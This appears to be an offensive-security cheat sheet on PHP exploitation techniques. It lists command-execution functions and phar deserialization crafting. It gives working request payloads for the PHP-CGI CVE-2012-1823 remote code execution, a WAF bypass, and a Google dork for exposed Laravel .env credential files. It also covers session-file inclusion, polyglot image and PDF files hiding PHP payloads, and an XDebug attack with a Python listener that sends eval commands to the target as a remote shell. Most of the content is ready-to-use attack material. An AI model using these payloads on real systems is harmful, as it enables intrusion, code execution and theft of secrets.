# PHP

## Command execution

Here is a list of functions to execute commands on a system:

```
exec
passthru
shell_exec
system
proc_open
popen
`{CMD}`
curl_exec
curl_multi_exec
```


## Deserialization

### Phar deserialization

The unserialization of a `phar` wrapper is realized in any file operation. Thus,
file operation such as `file_exists` might be less protected, then it's possible
to inject a `phar` wrapper within it.

The following code describes how to create a `phar` wrapper:

```php
<?php

require('weak_class.php');
# We craft an object by overwriting some methods and functions
$obj = new WeakClass();
$obj->args = "id";

# Then, we serialize the object to a file
file_put_contents("/tmp/exploit.phar", serialize($obj));
```

Here is an example of exploitable functions:

```
copy
file_exists
file_get_contents
file_put_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
fopen
is_dir
is_executable
is_file
is_link
is_readable
is_writable
lstat
mkdir
parse_ini_file
readfile
rename
rmdir
stat
touch
unlink
```


## CVE-2012-1823: RCE in PHP-CGI

PHP-CGI up to version 5.3.12 and 5.4.2 is vulnerable to an argument injection.

You can show the page source code:
```
GET https://<host>/file.php?-s
```

Or even execute PHP scripts (or a remote code execution)
```
POST https://<host>/file.php?-d%20allow_url_include%3d1%20-d%20auto_prepend_file%3dphp://input

<?php system('whoami'); ?>
```

More details can be found on the Metasploit script [here](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/php_cgi_arg_injection.rb)


## Bypass WAF in PHP

From [Abusing PHP query string parser to bypass IDS, IPS, and WAF](https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/):

```
/news.php?%20news[id%00=42 ==> $_GET["news_id"]
```


## Laravel configuration file

The Laravel configuration file is sometimes exposed on the Internet with a dotEnv
file at the root level of the web server:

```
https://<host>/.env
```

You can find vulnerable target using a Google dork:

```
"DB_PASSWORD" filetype:env
```


## PHP session files

On PHP the directive [`session.save_path`](https://www.php.net/manual/en/session.configuration.php#ini.session.save-path)
set the folder where PHP will store the session files. So the session files are
written on the disk. A malicious user may read this files to retrieve information.

On a Windows system (IIS), the default value create files in `C:\Windows\Temp`
with the name `sess_<session_id>`. The `<session_id>` is the value of the
`PHPSESSIONID` cookie. When you have a `Local File Inclusion` (LFI) vulnerability,
it's possible to include this kind of files.

This file contains some user's session variable. So a user can write some PHP
code like `<?php phpinfo() ?>` (as a username for example) in his session and
try to include the file to execute the PHP code.

Here is 2 examples of exploitation:

- The `Alcatel Omnivista 8770` uses this trick to fetch some internal session variable
from the user session. The [exploit](https://www.exploit-db.com/exploits/47761)
gets the session file that is accessible on the server `/session/sess_<session_id>`.

- `ippsec` use this technique in the HTB box [`Sniper`](https://www.youtube.com/watch?v=k7gD4ufex9Q&t=3255s)
to create a use with a username that contains some PHP code. Then he includes
the session file with a LFI.


## PHP type juggling

An application may compare a user input with a string value. For instance, a user
provide an API-Key then it's possible to supply the integer `0` in some `JSON`
payload to bypass some checks.

*Explanation*

- https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf
- https://www.synacktiv.com/sites/default/files/2021-10/advisory_Jeedom_Auth_Bypass_CVE-2021-42557.pdf


## PHP Polyglot file

A polyglot file is valid in two different format. For instance a valid `GIF`
file that contains a PHP payload.


### GIF89

[This file](/assets/polyglot.php.gif)) contains a PHP payload in the [Comment
Extension](https://www.w3.org/Graphics/GIF/spec-gif89a.txt) of a 1 pixel GIF:

```bash
hexdump -C assets/polyglot.php.gif
00000000  47 49 46 38 39 61 01 00  01 00 00 ff 00 2c 00 00  |GIF89a.......,..|
00000010  00 00 01 00 01 00 00 02  00 21 fe 3c 3f 70 68 70  |.........!.<?php|
00000020  69 6e 66 6f 28 29 3b                              |info();|
```

### PDF

You can add a comment (`%`) on the PDF header:

```pdf
%PDF-1.2 %<?phpinfo()?>
...
```


### PNG and IDAT chunks

[In this blog post](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/),
there is an example to create a PNG file that encode a [webshell](/webshell/)
in IDAT chunks.

The goal is to bypass some `PHP` functions such as `imagecreatefrompng`. The
exploit is [here](/assets/gen.php.png).


### Others formats

On most formats (mp3, jpg, ...) there is an `EOF` after what we can add the
payload. So the easiest way is to append to a valid file our payload:

```bash
cat valid.jpg payload.php > polyglot.php.jpg
```


## XDebug

Make a request with the following parameters and header:

```http
GET /path/to/file.php?XDEBUG_SESSION_START=phpstorm HTTP/1.1
...
X-Forwarded-For: {YOUR_IP}
HTTP_CLIENT_IP: {YOUR_IP}
```

Then on your server execute the following python script:

```python
#!/usr/bin/python2
import socket

ip_port = ('0.0.0.0', 9000)
sk = socket.socket()
sk.bind(ip_port)
sk.listen(10)
conn, addr = sk.accept()

while True:
  client_data = conn.recv(1024)
  print(client_data)
  data = raw_input('>> ')
  conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64'))
```
